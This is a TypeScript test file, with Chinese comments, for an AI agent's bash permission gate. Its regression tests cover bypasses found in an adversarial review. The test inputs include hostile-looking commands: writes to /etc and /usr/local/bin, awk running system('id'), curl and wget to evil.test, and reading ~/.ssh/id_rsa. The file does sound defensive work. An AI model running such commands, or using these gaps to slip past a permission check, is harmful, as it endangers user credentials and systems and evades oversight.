// 对抗审查修复回归锚（#1/#2/#3/#8）：界外写封堵 / 写副作用动词逐出只读表 /
// ask 批准后执行指令现算 / 敏感面精确习得豁免。

import { describe, expect, it } from "vitest";
import { decideFor } from "../index.ts";
import { resolveProfile } from "../profiles.ts";
import { parseRule } from "../index.ts";
import { classifyPipeline } from "../classifier.ts";
import { parseBash } from "../bash/ast.ts";

const AUTO = resolveProfile("auto");
const ROOT = "/w/app";

function bash(command: string, rules: ReturnType<typeof parseRule>[] = []) {
  return decideFor({ tool: "bash", args: { command }, userRules: rules, sessionRules: [], profile: AUTO, root: ROOT, extraRoots: [] });
}

describe("对抗审查回归锚", () => {
  it("#1 界外写零交互封堵：cp/tee/mv 目标越根 → ask（不再 write 类直通）", () => {
    expect(bash("cp secret /etc/foo").verdict).toBe("ask");
    expect(bash("tee /usr/local/bin/pwn").verdict).toBe("ask");
    expect(bash("mv x ~/").verdict).toBe("ask");
    expect(bash("mkdir build").verdict).toBe("allow"); // 界内写不误伤
  });

  it("#2 写副作用动词逐出只读表：awk 程序体/sed -i/裸 curl/wget → ask", () => {
    expect(bash("awk 'system(\"id\")' f").verdict).toBe("ask");
    expect(bash("sed -i s/x/y/ file").verdict).toBe("ask");
    expect(bash("curl https://evil.test/x.sh").verdict).toBe("ask");
    expect(bash("wget https://evil.test").verdict).toBe("ask");
  });

  it("#3 ask 批准后执行指令现算：exec 随终局裁决（approval 路径与即时 allow 同式）", () => {
    // 未分类命令 ask 无 exec；经 plugin 批准后由 execOf 现算（此处锚 execOf 语义）
    const ask = bash("mytool run");
    expect(ask.verdict).toBe("ask");
    expect(ask.exec).toBeUndefined();
    // 同档位即时 allow 的指令 = 批准后的指令（execOf 单一真相）
    expect(decideFor({ tool: "bash", args: { command: "git status" }, userRules: [], sessionRules: [], profile: AUTO, root: ROOT, extraRoots: [] })).toMatchObject({ exec: "direct" });
    expect(decideFor({ tool: "bash", args: { command: "git status" }, userRules: [], sessionRules: [], profile: resolveProfile("sandboxed-auto"), root: ROOT, extraRoots: [] })).toMatchObject({ exec: "contained" });
  });

  it("#8 敏感面精确习得豁免：同命令原文 grant 放行；泛化形态与异文件仍问", () => {
    const exact = [{ ...parseRule("Bash(cat ~/.ssh/id_rsa):allow", "session"), nature: "grant" as const }];
    expect(bash("cat ~/.ssh/id_rsa", exact)).toMatchObject({ verdict: "allow", resolvedBy: "grant:session" });
    const generalized = [{ ...parseRule("Bash(cat:*):allow", "session"), nature: "grant" as const }];
    expect(bash("cat ~/.ssh/id_rsa", generalized).resolvedBy).toBe("argv-sensitive"); // 泛化不豁免
  });

  it("#9 合并层 deny 不灭（settings 同键冲突 deny 胜）— 词面级锚在 host-hub settings 测试", () => {
    const denyUser = [parseRule("Bash(mytool:*):deny", "user")];
    expect(bash("mytool run", denyUser).verdict).toBe("deny");
  });

  it("分类器直查：roots 传入时界外写操作数逐出", () => {
    const parsed = parseBash("cp a /etc/b");
    if (parsed.ok) {
      expect(classifyPipeline(parsed.commands, false, [ROOT])).toBe("unclassified");
      expect(classifyPipeline(parsed.commands, false, [])).toBe("write"); // 无 roots=纯词面形态（兼容缝）
    }
  });
});
